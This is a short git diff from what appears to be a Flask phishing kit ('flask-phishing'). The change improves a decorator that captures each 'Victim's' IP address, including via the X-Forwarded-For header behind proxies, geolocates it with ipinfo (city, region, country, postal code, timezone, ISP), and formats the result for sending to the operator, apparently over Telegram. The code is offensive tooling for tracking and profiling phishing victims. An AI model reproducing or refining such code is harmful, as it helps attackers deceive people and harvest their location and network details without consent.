@@ -89,7 +89,11 @@ def send_telegram_userdata(func):
             textToSend += f"• Template: {template} 📸🐦🌐\n\n\n"
             # print("Sending Message")
             # send_telegram_message(textToSend)
-            ip = request.remote_addr  # type: ignore
+            if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+                ip = request.environ['REMOTE_ADDR']
+            else:
+                ip = request.environ['HTTP_X_FORWARDED_FOR']
+
             ipinfo_data = ipinfo(ip)
             print(ipinfo_data)
             if ipinfo_data:
@@ -97,13 +101,13 @@ def send_telegram_userdata(func):
                 ipToSend += textToSend
                 ipToSend += "* IP 🌎 and Address of Victim 🗺️*       \n\n"
                 ipToSend += f"• IP: {ip}  \n"
-                ipToSend += f"• City: {ipinfo_data['city']}  \n"
-                ipToSend += f"• Region: {ipinfo_data['region']}  \n"
-                ipToSend += f"• Country: {ipinfo_data['country']}  \n"
-                ipToSend += f"• Postal🌐: {ipinfo_data['postal']}  \n"
-                ipToSend += f"• TimeZone: {ipinfo_data['timezone']}  \n"
-                ipToSend += f"• ISP Org: {ipinfo_data['org']}  \n\n\n"
-                location = ipinfo_data['loc']
+                ipToSend += f"• City: {ipinfo_data.get('city','None')}  \n"
+                ipToSend += f"• Region: {ipinfo_data.get('region','None')}  \n"
+                ipToSend += f"• Country: {ipinfo_data.get('country','None')}  \n"
+                ipToSend += f"• Postal🌐: {ipinfo_data.get('postal','None')}  \n"
+                ipToSend += f"• TimeZone: {ipinfo_data.get('timezone','None')}  \n"
+                ipToSend += f"• ISP Org: {ipinfo_data.get('org','None')}  \n\n\n"
+                location = ipinfo_data.get('loc',None)
             else:
                 ipToSend = "Some Error Happened Please Tell to issues\n"
                 ipToSend += "Github Url = https://www.github.com/siddhant385/flask-phishing/issues"
